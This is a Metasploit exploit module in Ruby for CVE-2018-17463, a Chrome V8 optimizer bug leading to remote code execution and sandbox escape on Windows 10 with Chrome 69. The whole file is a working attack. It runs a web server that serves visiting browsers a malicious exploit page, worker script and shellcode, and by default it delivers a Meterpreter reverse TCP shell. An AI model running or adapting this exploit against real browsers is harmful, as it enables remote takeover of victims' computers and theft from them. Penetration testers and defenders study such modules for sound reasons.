##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Chrome V8 Optimizer RCE and Sandbox escape',
      'Description'    => %q{

      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'niklasb',          # exploit
        'nedwilliamson',    # sandbox escape
        'saelo',            # rce
        'timwr',            # copynpasta
        ],
      'References'     => [
          ['CVE', '2018-17463'],
          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=888923'],
          ['URL', 'https://twitter.com/nedwilliamson/status/1043150732742946816'],
        ],
      'Arch'           => [ ARCH_X64 ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Automatic', {} ],
          [ 'Windows 10 with Google Chrome 69.0.3497.100', { } ]
        ],
      'DefaultTarget'  => 0,
      'DefaultOptions' => { 'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp' },
      'DisclosureDate' => 'Sep 25 2018'))
  end

  def exploit_data(directory, file)
    path = ::File.join Msf::Config.data_directory, 'exploits', directory, file
    ::File.binread path
  end

  def exploit
    super
    reset_state
  end

  def reset_state
    # trigger
    @idx = -1
    @completed = [0]*1000

    # spray
    @seen = Set.new
    @doc_fetch = Set.new
  end

  def on_request_uri(cli, request)
    print_status("Request #{request.uri} from #{request['User-Agent']}")
    if request.uri =~ %r{/rce_worker.js$}
      payload_data = exploit_data 'CVE-2018-17463', 'rce_worker.js'
      send_response(cli, payload_data, {'Content-Type'=>'text/javascript', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      print_good "Sent renderer rce worker"
      return
    elsif request.uri =~ %r{/final_shellcode.bin$}
      payload_data = payload.raw
      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      print_good "Sent final payload shellcode"
      return
    elsif request.uri =~ %r{/shellcode.bin$}
      payload_data = exploit_data 'CVE-2018-17463', 'shellcode.bin'
      send_response(cli, payload_data, {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      print_good "Sent payload.dll"
      return
    elsif request.uri =~ %r{/reset$}
      send_response(cli, '', {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      return
    elsif request.uri =~ %r{/trigger/payload/\d+$}
      print_status "trigger #{$1} lol"
      send_response(cli, '', {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      return
    elsif request.uri =~ %r{/complete/\d+/\d+$}
      print_status "complete #{$1} and #{$2} lol"
      send_response(cli, '', {'Content-Type'=>'application/octet-stream', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
      return
    end

    pwn_js = exploit_data 'CVE-2018-17463', 'pwn.js'
    js_code = pwn_js

    #if datastore['DEBUG_EXPLOIT']
    #body += ''
#<pre id="progress"></pre>
#<pre id="progress-rce"></pre>
#<pre id="progress-infoleak"></pre>
#<pre id="progress-rip"></pre>
    #else
      #js_code.gsub!(/^\s*print\s*\(.*?\);\s*$/, '')
      #js_code.gsub!(/^\s*log\s*\(.*?\);\s*$/, '')
      #js_code.gsub!(/^\s*log_clear\s*\(.*?\);\s*$/, '')
    #end

    html = %Q^
<html>
<pre id="progress"></pre>
<pre id="progress-rce"></pre>
<pre id="progress-infoleak"></pre>
<pre id="progress-rip"></pre>
<body>
<script>
#{js_code}
</script>
</body>
</html>
    ^
    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
  end

end
